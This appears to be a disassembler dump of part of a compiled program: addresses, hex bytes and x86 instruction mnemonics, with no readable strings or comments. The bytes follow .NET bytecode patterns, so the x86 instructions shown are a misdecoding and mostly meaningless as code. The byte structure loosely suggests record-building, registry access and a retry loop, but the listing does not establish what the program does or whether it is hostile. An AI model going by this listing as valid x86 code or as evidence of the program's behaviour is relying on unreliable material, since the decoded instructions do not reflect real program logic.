  4036b3:	0a 28                	or     (%eax),%ch
  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 fe             	es jb  0x4036d0
  4036d2:	23 00                	and    (%eax),%eax
  4036d4:	70 0a                	jo     0x4036e0
  4036d6:	dd 00                	fldl   (%eax)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	10 24 00             	adc    %ah,(%eax,%eax,1)
  40372f:	70 28                	jo     0x403759
  403731:	91                   	xchg   %eax,%ecx
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 7a 21 00       	and    $0x217a72,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 16                	jb     0x403790
  40377a:	24 00                	and    $0x0,%al
  40377c:	70 6f                	jo     0x4037ed
  40377e:	8c 00                	mov    %es,(%eax)
  403780:	00 06                	add    %al,(%esi)
  403782:	25 72 2c 24 00       	and    $0x242c72,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 36 24 00       	and    $0x243672,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 40 24 00       	and    $0x244072,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 46                	jb     0x403813
  4037cd:	24 00                	and    $0x0,%al
  4037cf:	70 14                	jo     0x4037e5
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 5a             	or     0x5a(%edx),%dh
  4037d8:	24 00                	and    $0x0,%al
  4037da:	70 28                	jo     0x403804
  4037dc:	96                   	xchg   %eax,%esi
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	5e                   	pop    %esi
  4037ea:	24 00                	and    $0x0,%al
  4037ec:	70 72                	jo     0x403860
  4037ee:	68 24 00 70 6f       	push   $0x6f700024
  4037f3:	95                   	xchg   %eax,%ebp
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 72 74             	or     0x74(%edx),%dh
  4037f9:	24 00                	and    $0x0,%al
  4037fb:	70 72                	jo     0x40386f
  4037fd:	80 24 00 70          	andb   $0x70,(%eax,%eax,1)
  403801:	6f                   	outsl  %ds:(%esi),(%dx)
  403802:	95                   	xchg   %eax,%ebp
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 8c 24 00       	and    $0x248c72,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 96 24 00       	and    $0x249672,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 a6 24 00       	and    $0x24a672,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 b2             	or     -0x4e(%edx),%dh
  403859:	24 00                	and    $0x0,%al
  40385b:	70 72                	jo     0x4038cf
  40385d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40385e:	24 00                	and    $0x0,%al
  403860:	70 6f                	jo     0x4038d1
  403862:	95                   	xchg   %eax,%ebp
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 bc             	or     -0x44(%edx),%dh
  403868:	24 00                	and    $0x0,%al
  40386a:	70 72                	jo     0x4038de
  40386c:	36 24 00             	ss and $0x0,%al
  40386f:	70 6f                	jo     0x4038e0
  403871:	95                   	xchg   %eax,%ebp
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 c8 24 00       	and    $0x24c872,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 e0 24 00       	and    $0x24e072,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 f2 24 00       	and    $0x24f272,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 06 25 00       	and    $0x250672,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 1a 25 00       	and    $0x251a72,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 74                	jb     0x403969
  4038f5:	21 00                	and    %eax,(%eax)
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 24 25 00       	and    $0x252472,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 30             	adc    %esi,0x30(%edx)
  40399e:	25 00 70 28 8a       	and    $0x8a287000,%eax
  4039a3:	00 00                	add    %al,(%eax)
  4039a5:	0a 72 36             	or     0x36(%edx),%dh
  4039a8:	25 00 70 28 68       	and    $0x68287000,%eax
  4039ad:	00 00                	add    %al,(%eax)
  4039af:	0a 72 62             	or     0x62(%edx),%dh
  4039b2:	25 00 70 73 a1       	and    $0xa1737000,%eax
  4039b7:	00 00                	add    %al,(%eax)
  4039b9:	0a 0a                	or     (%edx),%cl
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 a0    	or     0xa0720907,%cl
  4039dd:	25 00 70 6f 83       	and    $0x836f7000,%eax
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 b8                	jb     0x4039ce
  403a16:	25 00 70 13 04       	and    $0x4137000,%eax
  403a1b:	dd 31                	fnsave (%ecx)
  403a1d:	00 00                	add    %al,(%eax)
  403a1f:	00 72 c0             	add    %dh,-0x40(%edx)
  403a22:	25 00 70 07 6f       	and    $0x6f077000,%eax
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 b8                	jb     0x4039ff
  403a47:	25 00 70 13 04       	and    $0x4137000,%eax
  403a4c:	dd 00                	fldl   (%eax)
  403a4e:	00 00                	add    %al,(%eax)
  403a50:	00 11                	add    %dl,(%ecx)
  403a52:	04 2a                	add    $0x2a,%al
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 74             	add    %dh,0x74(%edx)
  403b3e:	21 00                	and    %eax,(%eax)
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
  403c1b:	0b dd                	or     %ebp,%ebx
  403c1d:	1e                   	push   %ds
  403c1e:	00 00                	add    %al,(%eax)
  403c20:	00 06                	add    %al,(%esi)
  403c22:	39 06                	cmp    %eax,(%esi)
  403c24:	00 00                	add    %al,(%eax)
  403c26:	00 06                	add    %al,(%esi)
  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
